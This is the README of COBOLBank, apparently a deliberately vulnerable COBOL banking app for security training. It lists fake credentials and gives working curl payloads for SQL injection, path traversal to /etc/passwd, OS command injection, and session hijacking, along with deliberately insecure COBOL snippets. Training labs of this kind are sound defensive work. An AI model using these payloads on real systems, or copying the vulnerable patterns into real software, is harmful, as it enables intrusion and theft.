```
  ██████╗ ██████╗ ██████╗  ██████╗ ██╗      ██████╗  █████╗ ███╗   ██╗██╗  ██╗
 ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗██║     ██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
 ██║     ██║   ██║██████╔╝██║   ██║██║     ██████╦╝███████║██╔██╗ ██║█████╔╝
 ██║     ██║   ██║██╔══██╗██║   ██║██║     ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗
 ╚██████╗╚██████╔╝██████╔╝╚██████╔╝███████╗██████╦╝██║  ██║██║ ╚████║██║  ██╗
  ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝

              An Intentionally Vulnerable COBOL Banking Application
                         for Security Training & Research
```

> **⚠️ WARNING: This application is deliberately and thoroughly insecure.**
> It is designed exclusively for security education and training in isolated
> environments. **NEVER** deploy it on a public network, expose it to the
> internet, or use it with real data of any kind. All credentials, SSNs, and
> API keys in this project are fake.

---

## Table of Contents

- [What is COBOLBank?](#what-is-cobolbank)
- [Quick Start](#quick-start)
- [Credentials & Test Data](#credentials--test-data)
- [Architecture](#architecture)
- [Challenges](#challenges)
- [Vulnerability Index](#vulnerability-index)
- [Attacking the Endpoints](#attacking-the-endpoints)
- [GnuCOBOL Notes for Researchers](#gnucobol-notes-for-researchers)
- [Resetting the Environment](#resetting-the-environment)
- [Legal Disclaimer](#legal-disclaimer)

---

## What is COBOLBank?

COBOLBank is a deliberately vulnerable web application styled as a corporate
banking portal. Unlike most vulnerable-by-design apps, **the vulnerabilities
live in real COBOL source code** — not in a wrapper language around it.

Every API request is handled by a GnuCOBOL binary executed directly by Apache
mod_cgi. There is no Node.js, no Python, no Java in the request path. The SQL
injection is in COBOL STRING concatenation. The path traversal is in a COBOL
FILE SECTION. The command injection is in a COBOL `CALL "SYSTEM"` statement.

COBOLBank is inspired by DVWA, WebGoat, and OWASP's vulnerable apps — adapted
for a language that still processes an estimated **$3 trillion in daily commerce**
yet has almost no dedicated security training tooling.

**Who is it for?**

- Security engineers learning COBOL-specific attack surfaces
- Developers understanding how legacy COBOL systems introduce modern web risks
- CTF organizers looking for unusual challenge themes
- Security trainers running hands-on workshops on financial-sector systems
- Researchers exploring automated remediation of COBOL vulnerabilities

---

## Quick Start

### Prerequisites

- [Docker](https://docs.docker.com/get-docker/) 20.10+
- [Docker Compose](https://docs.docker.com/compose/install/) v2

```bash
git clone https://github.com/pixee/cobol-goat.git
cd cobol-goat
docker compose up
```

The application starts on **http://localhost:3000**.

On first boot the container:
1. Seeds the SQLite database with users, accounts, and intentionally sensitive data
2. Writes pre-populated log files containing simulated credentials and query history
3. Creates predictable session files for the session-hijacking challenge
4. Starts Apache with mod_cgi and mod_rewrite configured

To rebuild from source after modifying COBOL programs:

```bash
docker compose down -v
docker compose build --no-cache
docker compose up
```

---

## Credentials & Test Data

### User Accounts

| Username | Password     | Role  |
|----------|-------------|-------|
| admin    | c0b0ladm1n  | admin |
| alice    | password123 | user  |
| bob      | letmein     | user  |
| charlie  | qwerty      | user  |

### Bank Account IDs (for IDOR challenges)

| Account ID | Owner   | Balance      | SSN         |
|-----------|---------|-------------|-------------|
| 1001      | alice   | $15,432.50  | 123-45-6789 |
| 1002      | bob     | $2,100.00   | 987-65-4321 |
| 1003      | admin   | $999,999.99 | 000-00-0000 |
| 1004      | charlie | $500.00     | 555-12-9876 |

### Session Tokens (for session hijacking challenge)

| Cookie value      | Session     |
|------------------|-------------|
| `COBSESSID=1000` | admin session |
| `COBSESSID=1001` | alice session |

---

## Architecture

COBOLBank uses **Apache mod_cgi** to serve GnuCOBOL binaries directly. There
is no application server or intermediary runtime — Apache forks a COBOL process
per request, the binary writes HTTP headers and a JSON body to stdout, Apache
sends it to the client.

```
Browser / curl
      │
      ▼
┌─────────────────────────────────────────────────────────────┐
│                      Docker Container                        │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Apache 2.4  (mod_cgi, mod_rewrite, mod_headers)     │   │
│  │                                                      │   │
│  │  Static files  →  /var/www/html/  (HTML/CSS/JS)      │   │
│  │                                                      │   │
│  │  RewriteRule /api/auth/login     → /cgi-bin/login    │   │
│  │  RewriteRule /api/accounts/{id}  → /cgi-bin/account- │   │
│  │                                    lookup?id={id}    │   │
│  │  RewriteRule /api/products/search → /cgi-bin/search  │   │
│  │  RewriteRule /api/files/read     → /cgi-bin/file-read│   │
│  │  RewriteRule /api/reports/generate→ /cgi-bin/report- │   │
│  │                                    gen               │   │
│  │  ... (11 routes total)                               │   │
│  └────────────────────────┬─────────────────────────────┘   │
│                           │  fork() per request (mod_cgi)   │
│  ┌────────────────────────▼─────────────────────────────┐   │
│  │  GnuCOBOL CGI Binaries  /app/cobol/cgi-bin/          │   │
│  │                                                      │   │
│  │  login          account-lookup    search             │   │
│  │  transfer       file-read         report-gen         │   │
│  │  admin-check    interest-calc     config-reader      │   │
│  │  debug          session-check                        │   │
│  │                                                      │   │
│  │  Shared COPY books  /app/cobol/copybooks/            │   │
│  │    ws-cgi.cpy   ws-http.cpy   ws-sql.cpy             │   │
│  │    proc-cgi.cpy  proc-http.cpy                       │   │
│  │                                                      │   │
│  │  CALL "sqlexec" ─────────────────────────────────┐   │   │
│  │  CALL "jsonget"  (COB_LIBRARY_PATH resolution)   │   │   │
│  │  CALL "urlparam" ────────────────────────────────┘   │   │
│  └────────────────────────┬─────────────────────────────┘   │
│                           │                  │               │
│  ┌────────────────────────▼──────┐  ┌────────▼───────────┐  │
│  │  C SQLite Bridge              │  │  SQLite Database   │  │
│  │  /app/cobol/lib/              │  │  cobolgoat.db      │  │
│  │    sqlexec.so                 │  │                    │  │
│  │    jsonget.so                 │  │  users             │  │
│  │    urlparam.so                │  │  accounts          │  │
│  │                               │  │  secret_data       │  │
│  │  (cobol-sqlite.c compiled     │  │  audit_log         │  │
│  │   with libsqlite3)            │  │                    │  │
│  └───────────────────────────────┘  └────────────────────┘  │
│                                                             │
│  /tmp/cobol-goat/         world-writable; auth/sql logs     │
│  /app/reports/            report files for path traversal   │
└─────────────────────────────────────────────────────────────┘
```

### Source Layout

```
cobol-goat/
├── cobol/
│   ├── cgi/            # 11 COBOL CGI programs (one per vulnerability)
│   ├── copybooks/      # Shared COPY books (CGI env, HTTP headers, SQL fields)
│   ├── lib/            # C SQLite bridge source + compiled .so files
│   └── Makefile
├── apache/
│   └── cobolbank.conf  # VirtualHost: ScriptAlias, RewriteRules, SetEnv
├── frontend/
│   └── public/         # Static HTML/CSS/JS served by Apache
├── database/           # SQLite schema (seeded at runtime by entrypoint.sh)
├── scripts/
│   └── entrypoint.sh   # DB seed + session file creation + apache2ctl
├── Dockerfile          # Multi-stage: GnuCOBOL builder → Debian runtime
└── docker-compose.yml
```

### How a Request Flows

1. Browser sends `POST /api/auth/login` with JSON body
2. Apache rewrites to `/cgi-bin/login` and forks `login` binary
3. Apache sets CGI environment variables: `REQUEST_METHOD=POST`,
   `CONTENT_LENGTH=...`, etc.
4. `login` reads vars via `ACCEPT ... FROM ENVIRONMENT "REQUEST_METHOD"`,
   reads POST body via `ACCEPT CGI-POST-BODY`
5. `login` calls `CALL "jsonget"` (C bridge) to extract username/password
6. `login` builds SQL via `STRING "SELECT ... WHERE username='" ...` and calls
   `CALL "sqlexec"` (C bridge → SQLite)
7. `login` writes `Content-Type: application/json\n\n{"success":true,...}` to
   stdout
8. Apache reads stdout and sends the response

---

## Challenges

| # | Challenge | Difficulty | Vulnerability |
|---|-----------|-----------|---------------|
| 1 | **User Authentication** | ★☆☆☆☆ | SQL injection in login |
| 2 | **Account Access Portal** | ★☆☆☆☆ | IDOR — view any account |
| 3 | **Transaction Search** | ★★☆☆☆ | SQL injection via LIKE |
| 4 | **Document Viewer** | ★★☆☆☆ | Path traversal (COBOL FILE SECTION) |
| 5 | **Reports Center** | ★★★☆☆ | OS command injection (`CALL "SYSTEM"`) |
| 6 | **Administration** | ★★☆☆☆ | Broken access control (query-param role) |
| 7 | **Fund Transfer** | ★★☆☆☆ | Missing authorization, negative amounts |
| 8 | **Investment Calculator** | ★★★☆☆ | Numeric overflow (PIC 9(8)V99) |
| 9 | **Configuration** | ★☆☆☆☆ | Hardcoded secrets, unauthenticated endpoint |
|10 | **Developer Tools** | ★☆☆☆☆ | Unauthenticated env dump + log disclosure |
|11 | **Session Management** | ★★★☆☆ | Predictable tokens, path traversal via cookie |

---

## Vulnerability Index

| Vulnerability | CWE | OWASP 2021 | COBOL Location |
|--------------|-----|-----------|----------------|
| SQL Injection (login) | CWE-89 | A03 Injection | `login.cbl` STRING into WHERE clause |
| SQL Injection (search) | CWE-89 | A03 Injection | `search.cbl` STRING into LIKE |
| SQL Injection (account) | CWE-89 | A03 Injection | `account-lookup.cbl` WHERE id= |
| OS Command Injection | CWE-78 | A03 Injection | `report-gen.cbl` CALL "SYSTEM" |
| Path Traversal | CWE-22 | A01 Broken Access Control | `file-read.cbl` ASSIGN TO DYNAMIC |
| Path Traversal (session) | CWE-22 | A01 Broken Access Control | `session-check.cbl` cookie → file path |
| IDOR + SSN Exposure | CWE-639 | A01 Broken Access Control | `account-lookup.cbl` |
| Broken Access Control | CWE-862 | A01 Broken Access Control | `admin-check.cbl` trusts role= param |
| Hardcoded Credentials | CWE-798 | A07 Auth Failures | `login.cbl` VALUE "c0b0ladm1n" |
| Hardcoded Secrets | CWE-798 | A07 Auth Failures | `config-reader.cbl` VALUE clauses |
| Plaintext Password Log | CWE-532 | A09 Logging Failures | `login.cbl` CALL "SYSTEM" echo |
| Plaintext Password Storage | CWE-256 | A02 Crypto Failures | `users` table, no hashing |
| Unencrypted SSNs | CWE-311 | A02 Crypto Failures | `accounts` table |
| Secrets in Database | CWE-312 | A02 Crypto Failures | `secret_data` table |
| Unauthenticated Sensitive Endpoint | CWE-306 | A07 Auth Failures | `debug.cbl`, `config-reader.cbl` |
| Predictable Session Tokens | CWE-330 | A07 Auth Failures | `session-check.cbl` sequential IDs |
| Numeric Overflow | CWE-190 | A04 Insecure Design | `interest-calc.cbl` PIC 9(8)V99 |
| Verbose Error Messages | CWE-209 | A05 Misconfig | All programs return raw SQL queries |
| World-Writable Log Dir | CWE-732 | A05 Misconfig | `/tmp/cobol-goat/` |

---

## Attacking the Endpoints

### SQL Injection — Login

```bash
# Classic bypass
curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"x"}'

# Response includes the raw query:
# "query": "SELECT id, username, role FROM users WHERE username='admin' OR '1'='1' --' AND password='x'"
```

### IDOR — Account Lookup

```bash
# Fetch any account, regardless of who you are
curl http://localhost:3000/api/accounts/1003    # admin's account + SSN
curl http://localhost:3000/api/accounts/1001    # alice's account + SSN

# No session cookie required
```

### SQL Injection — Search

```bash
# UNION-based injection to pivot to secret_data
curl "http://localhost:3000/api/products/search?q=%25' UNION SELECT key,value,'x' FROM secret_data--"
```

### Path Traversal — File Read

```bash
# Read system files
curl "http://localhost:3000/api/files/read?file=../../etc/passwd"
curl "http://localhost:3000/api/files/read?file=../../etc/hostname"

# Read the SQLite database itself
curl "http://localhost:3000/api/files/read?file=../../database/cobolgoat.db"

# Read the auth log (contains plaintext passwords)
curl "http://localhost:3000/api/files/read?file=../../tmp/cobol-goat/auth.log"
```

### OS Command Injection — Report Generator

```bash
# The reportType field is embedded in a shell command without sanitization.
# Break out of the single-quote context to inject arbitrary commands:
curl -s -X POST http://localhost:3000/api/reports/generate \
  -H "Content-Type: application/json" \
  -d '{"reportType":"monthly'\''%3B id%3B echo '\''","format":"pdf"}'

# The response "command" field shows what was executed.
# Injected output appears before the JSON headers, causing a visible 500 —
# but the command runs as root inside the container.
```

### Broken Access Control — Admin

```bash
# Any user can claim admin role via query parameter
curl "http://localhost:3000/api/admin/action?userId=2&role=admin&action=delete_user"
```

### Hardcoded Secrets — Config

```bash
# No authentication required
curl http://localhost:3000/api/config
# Returns DB passwords, API keys, AWS credentials, JWT secret — all hardcoded
# in COBOL VALUE clauses, embedded in the binary
```

### Unauthenticated Debug Endpoints

```bash
# Full process environment dump
curl http://localhost:3000/api/debug/env

# Auth and SQL log files (contain plaintext passwords)
curl http://localhost:3000/api/debug/logs
```

### Session Hijacking

```bash
# Sequential session tokens — enumerate them
curl -H "Cookie: COBSESSID=1000" http://localhost:3000/api/session  # admin
curl -H "Cookie: COBSESSID=1001" http://localhost:3000/api/session  # alice

# Path traversal via session cookie
curl -H "Cookie: COBSESSID=../../etc/hostname" http://localhost:3000/api/session
```

---

## GnuCOBOL Notes for Researchers

COBOLBank uses [GnuCOBOL](https://gnucobol.sourceforge.io/) (formerly OpenCOBOL),
an open-source COBOL compiler that translates COBOL to C and compiles with GCC.
Programs run as standard Linux ELF binaries.

### Running a CGI Binary Manually

You can invoke any CGI program directly inside the container by setting the
CGI environment variables manually:

```bash
docker exec cobol-goat-app-1 sh -c '
  COB_LIBRARY_PATH=/app/cobol/lib \
  REQUEST_METHOD=GET \
  QUERY_STRING="id=1001" \
  COBOLGOAT_DB=/app/database/cobolgoat.db \
  /app/cobol/cgi-bin/account-lookup
'
```

### How COBOL Reads CGI Variables

```cobol
ACCEPT CGI-REQUEST-METHOD   FROM ENVIRONMENT "REQUEST_METHOD"
ACCEPT CGI-QUERY-STRING     FROM ENVIRONMENT "QUERY_STRING"
ACCEPT CGI-POST-BODY                                          *> from stdin
```

### How COBOL Calls SQLite

COBOL has no native database driver. The C bridge (`cobol-sqlite.c`) is compiled
into shared libraries loaded at runtime:

```cobol
*> Build query by STRING concatenation — this is the injection point
STRING "SELECT id, owner, balance, ssn FROM accounts"
       " WHERE id='" FUNCTION TRIM(WS-ACCOUNT-ID) DELIMITED SIZE "'"
       DELIMITED SIZE INTO WS-SQL-QUERY
END-STRING

*> Execute — sqlexec.so runs the query verbatim
CALL "sqlexec" USING BY REFERENCE WS-SQL-QUERY
                     BY REFERENCE WS-SQL-RESULT
```

### How COBOL Does Path Traversal

The FILE SECTION's `ASSIGN TO DYNAMIC` binds a file path at runtime from a
WORKING-STORAGE variable:

```cobol
FILE-CONTROL.
    SELECT REPORT-FILE ASSIGN TO DYNAMIC WS-FULL-PATH
        ORGANIZATION IS LINE SEQUENTIAL
        FILE STATUS IS WS-FILE-STATUS.
...
BUILD-FILE-PATH.
    STRING FUNCTION TRIM(WS-BASE-PATH) DELIMITED SIZE   *> "/app/reports/"
           FUNCTION TRIM(WS-FILENAME)  DELIMITED SIZE   *> user-controlled
           INTO WS-FULL-PATH
    END-STRING.
```

### Key COBOL Patterns Used

| Pattern | Purpose |
|---------|---------|
| `88 CGI-IS-POST VALUE "POST"` | 88-level condition name on REQUEST_METHOD |
| `EVALUATE TRUE / WHEN ...` | Multi-way branching (switch equivalent) |
| `STRING ... DELIMITED SIZE INTO` | String concatenation (SQL building) |
| `CALL "SYSTEM" USING WS-CMD` | Shell command execution |
| `ASSIGN TO DYNAMIC WS-PATH` | Runtime file path (path traversal) |
| `PIC 9(8)V99` | Fixed-point decimal (overflow target) |
| `INSPECT ... TALLYING ... BEFORE` | String scanning (session cookie parsing) |
| `COPY "ws-cgi.cpy"` | Include shared data definitions |

---

## Resetting the Environment

Wipe the database and all logs, start fresh:

```bash
docker compose down -v && docker compose up
```

The `-v` flag removes named Docker volumes, causing the database, logs, and
session files to be re-seeded on next boot.

---

## Legal Disclaimer

COBOLBank is provided for **educational and authorized security testing purposes
only**. By using this software you agree that:

- You will only deploy COBOLBank in isolated, controlled environments
- You will not use COBOLBank with real personal data, financial data, or credentials
- You will not expose COBOLBank on any network accessible to unauthorized users
- The maintainers accept no liability for misuse or any damages arising from
  use of this software

All sensitive-looking data in this project is simulated:
- SSNs are fictional
- The AWS key ID (`AKIAIOSFODNN7EXAMPLE`) is the official AWS documentation example key
- API keys and passwords are not real credentials for any service

---

*COBOLBank is an experimental project by [Pixee](https://pixee.ai) — building
automated security remediation tooling for the languages that run the world's
financial infrastructure, including COBOL.*
